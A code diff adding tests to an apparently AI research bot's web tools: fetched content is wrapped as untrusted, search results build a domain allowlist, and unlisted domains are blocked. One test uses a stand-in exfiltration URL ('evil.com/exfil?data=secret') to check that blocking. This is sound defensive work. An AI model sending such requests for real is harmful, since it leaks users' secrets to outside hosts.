@@ -272,7 +272,20 @@ class TestExecuteTool:
             ]
             msg, is_finish = await execute_tool(tc, session, bot, 123, settings)
         assert "Result" in msg["content"]
+        assert "<untrusted-content" in msg["content"]
+        assert "</untrusted-content>" in msg["content"]
         assert not is_finish
+
+    async def test_web_search_populates_allowed_domains(self, session, bot, settings):
+        tc = make_tool_call("web_search", {"query": "test"})
+        with patch("deeper_bot.tools.executor.DDGS") as mock_ddgs:
+            mock_ddgs.return_value.text.return_value = [
+                {"title": "A", "href": "https://example.com/page", "body": "..."},
+                {"title": "B", "href": "https://docs.python.org/3/", "body": "..."},
+            ]
+            await execute_tool(tc, session, bot, 123, settings)
+        assert "example.com" in session.allowed_domains
+        assert "python.org" in session.allowed_domains
 
     async def test_finish_valid_small(self, session, bot, settings):
         tc = make_tool_call("finish", {"result_markdown": "# Report\nDone."})
@@ -419,6 +432,13 @@ class TestSetStatus:
 
 
 class TestWebFetchSummarization:
+    @pytest.fixture
+    def fetch_session(self):
+        """Session with allowed_domains pre-populated so web_fetch doesn't block."""
+        s = Session(chat_id=1)
+        s.allowed_domains = {"example.com", "slow.example.com", "evil.com"}
+        return s
+
     def _mock_http_stream(self, html_text="<html>ok</html>", status_code=200):
         """Return a context manager that patches _get_http_client for streaming."""
         mock_response = AsyncMock()
@@ -437,8 +457,8 @@ class TestWebFetchSummarization:
         mock_client.stream = MagicMock(return_value=mock_response)
         return patch("deeper_bot.tools.executor._get_http_client", return_value=mock_client)
 
-    async def test_short_content_returned_as_is(self, settings):
-        """Content under the limit should be returned without summarization."""
+    async def test_short_content_returned_wrapped(self, fetch_session, settings):
+        """Content under the limit should be returned wrapped without summarization."""
         from deeper_bot.tools import _web_fetch
 
         short_content = "Short article content."
@@ -448,12 +468,14 @@ class TestWebFetchSummarization:
             patch("deeper_bot.tools.executor.trafilatura.extract", return_value=short_content),
             patch("deeper_bot.tools.executor.llm_call_with_retry", new_callable=AsyncMock) as mock_llm,
         ):
-            result = await _web_fetch("http://example.com", settings)
+            result = await _web_fetch("http://example.com", fetch_session, settings)
 
-        assert result == short_content
+        assert short_content in result
+        assert "<untrusted-content" in result
+        assert "</untrusted-content>" in result
         mock_llm.assert_not_called()
 
-    async def test_long_content_summarized(self, settings):
+    async def test_long_content_summarized(self, fetch_session, settings):
         """Content over the limit should be summarized via LLM."""
         from deeper_bot.tools import _web_fetch
 
@@ -472,13 +494,13 @@ class TestWebFetchSummarization:
                 return_value=mock_llm_response,
             ),
         ):
-            result = await _web_fetch("http://example.com", settings)
+            result = await _web_fetch("http://example.com", fetch_session, settings)
 
-        assert result.startswith("[Content summarized")
-        assert "20000" in result
+        assert "Content summarized" in result
         assert summary_text in result
+        assert "<untrusted-content" in result
 
-    async def test_summarization_failure_falls_back_to_truncation(self, settings):
+    async def test_summarization_failure_falls_back_to_truncation(self, fetch_session, settings):
         """If LLM summarization fails, should fall back to truncation."""
         from deeper_bot.tools import _web_fetch
 
@@ -493,12 +515,12 @@ class TestWebFetchSummarization:
                 side_effect=Exception("LLM error"),
             ),
         ):
-            result = await _web_fetch("http://example.com", settings)
+            result = await _web_fetch("http://example.com", fetch_session, settings)
 
-        assert result.endswith("[Content truncated]")
-        assert len(result) < len(long_content)
+        assert "Content truncated" in result
+        assert "<untrusted-content" in result
 
-    async def test_ssrf_blocked_returns_error_message(self, settings):
+    async def test_ssrf_blocked_returns_error_message(self, fetch_session, settings):
         """SSRF-blocked URL should return error string, not raise."""
         from deeper_bot.tools import SSRFBlockedError, _web_fetch
 
@@ -512,11 +534,11 @@ class TestWebFetchSummarization:
         mock_client.stream = MagicMock(return_value=mock_response)
 
         with patch("deeper_bot.tools.executor._get_http_client", return_value=mock_client):
-            result = await _web_fetch("http://evil.com", settings)
+            result = await _web_fetch("http://evil.com", fetch_session, settings)
 
         assert "Access denied" in result
 
-    async def test_timeout_returns_error_message(self, settings):
+    async def test_timeout_returns_error_message(self, fetch_session, settings):
         """Httpx timeout should return a user-friendly error."""
         import httpx
 
@@ -530,6 +552,48 @@ class TestWebFetchSummarization:
         mock_client.stream = MagicMock(return_value=mock_response)
 
         with patch("deeper_bot.tools.executor._get_http_client", return_value=mock_client):
-            result = await _web_fetch("http://slow.example.com", settings)
+            result = await _web_fetch("http://slow.example.com", fetch_session, settings)
 
         assert "timed out" in result.lower()
+
+    async def test_web_fetch_blocked_domain(self, settings):
+        """web_fetch should block domains not in the allowed set."""
+        from deeper_bot.tools import _web_fetch
+
+        session = Session(chat_id=1)
+        session.allowed_domains = {"example.com"}
+        result = await _web_fetch("http://evil.com/exfil?data=secret", session, settings)
+        assert "not in the set of known domains" in result
+
+    async def test_web_fetch_empty_allowlist_permits(self, settings):
+        """web_fetch should permit any domain when allowlist is empty (gate not active)."""
+        from deeper_bot.tools import _web_fetch
+
+        session = Session(chat_id=1)
+        short_content = "Page content."
+
+        with (
+            self._mock_http_stream(),
+            patch("deeper_bot.tools.executor.trafilatura.extract", return_value=short_content),
+        ):
+            result = await _web_fetch("http://anything.com", session, settings)
+
+        assert short_content in result
+        assert "<untrusted-content" in result
+
+    async def test_web_fetch_search_engine_always_permitted(self, settings):
+        """web_fetch to a search engine should succeed even when not in allowed_domains."""
+        from deeper_bot.tools import _web_fetch
+
+        session = Session(chat_id=1)
+        session.allowed_domains = {"example.com"}  # gate is active, google.com not listed
+        short_content = "Search results page."
+
+        with (
+            self._mock_http_stream(),
+            patch("deeper_bot.tools.executor.trafilatura.extract", return_value=short_content),
+        ):
+            result = await _web_fetch("https://www.google.com/search?q=test", session, settings)
+
+        assert short_content in result
+        assert "<untrusted-content" in result
